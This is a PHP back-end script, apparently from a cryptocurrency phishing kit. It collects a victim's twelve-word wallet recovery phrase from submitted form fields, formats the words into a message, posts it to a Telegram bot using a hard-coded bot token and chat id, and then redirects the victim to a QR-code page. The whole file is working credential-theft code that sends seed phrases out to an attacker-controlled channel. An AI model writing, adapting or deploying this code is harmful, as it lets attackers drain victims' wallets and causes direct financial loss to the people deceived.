<?php

//------------------------------------------------------------------
// Email Function --
$sendtoemail = "yes";
$email = "";
// Telegram Function --
$sendtotelegram = "yes";
$chat_id = "951261137g";
$bot_url = "5963887785:AAGpNa8vl3HCcXbQs51VSzfM_X0HvB_BJPw";

//---------------------------------------------

$_SESSION['copykey0'] = $_POST['copykey0'];
$_SESSION['copykey1'] = $_POST['copykey1'];
$_SESSION['copykey2'] = $_POST['copykey2'];
$_SESSION['copykey3'] = $_POST['copykey3'];
$_SESSION['copykey4'] = $_POST['copykey4'];
$_SESSION['copykey5'] = $_POST['copykey5'];
$_SESSION['copykey6'] = $_POST['copykey6'];
$_SESSION['copykey7'] = $_POST['copykey7'];
$_SESSION['copykey8'] = $_POST['copykey8'];
$_SESSION['copykey9'] = $_POST['copykey9'];
$_SESSION['copykey10'] = $_POST['copykey10'];
$_SESSION['copykey11'] = $_POST['copykey11'];
$_SESSION['copykey12'] = $_POST['copykey12'];

$ok .= "
🇵🇰☪️—————💎🦋 12 Phrase 🦋 DETAILS 🦋💎—————☪️🇵🇰  \r\n

[12 Phrase Copy]     :      {$_SESSION['copykey0']} \r\n
[Phrase 1]     :      {$_SESSION['copykey1']} \r\n
[Phrase 2]     :      {$_SESSION['copykey2']} \r\n
[Phrase 3]     :      {$_SESSION['copykey3']} \r\n
[Phrase 4]     :      {$_SESSION['copykey4']} \r\n
[Phrase 5]     :      {$_SESSION['copykey5']} \r\n
[Phrase 6]     :      {$_SESSION['copykey6']} \r\n
[Phrase 7]     :      {$_SESSION['copykey7']} \r\n
[Phrase 8]     :      {$_SESSION['copykey8']} \r\n
[Phrase 9]     :      {$_SESSION['copykey9']} \r\n
[Phrase 10]     :      {$_SESSION['copykey10']} \r\n
[Phrase 11]     :      {$_SESSION['copykey11']} \r\n
[Phrase 12]     :      {$_SESSION['copykey12']} \r\n
";

if ($sendtotelegram == "yes") {
    $txt = $ok;
    $send = ['chat_id' => $chat_id, 'text' => $txt];
    $url = "https://api.telegram.org/bot{$bot_url}/sendMessage";
    $options = [
        'http' => [
            'method' => 'POST',
            'header' => 'Content-Type: application/x-www-form-urlencoded',
            'content' => http_build_query($send)
        ]
    ];
    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
}

header("Location: ./qr-code.php");
exit;
